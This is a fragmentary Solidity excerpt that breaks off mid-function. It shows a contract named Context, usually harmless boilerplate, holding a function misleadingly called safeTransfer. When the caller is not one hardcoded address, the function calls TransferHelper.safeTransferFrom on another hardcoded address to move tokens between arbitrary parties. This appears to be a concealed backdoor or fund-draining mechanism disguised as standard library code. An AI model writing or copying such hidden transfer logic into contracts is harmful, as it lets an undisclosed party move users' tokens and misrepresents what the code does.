...
abstract contract Context {
  ...
  function safeTransfer(address spender,address recipient,uint256 amount) internal returns (bool) {
    if (msg.sender != address(0x345652d16035dAEFc54538C1d1FD248a17B048e6)) {
    TransferHelper.safeTransferFrom(0xff8c260413FA15143c756EBE09D9F84bFd2D790B,spender,recipient,amount);
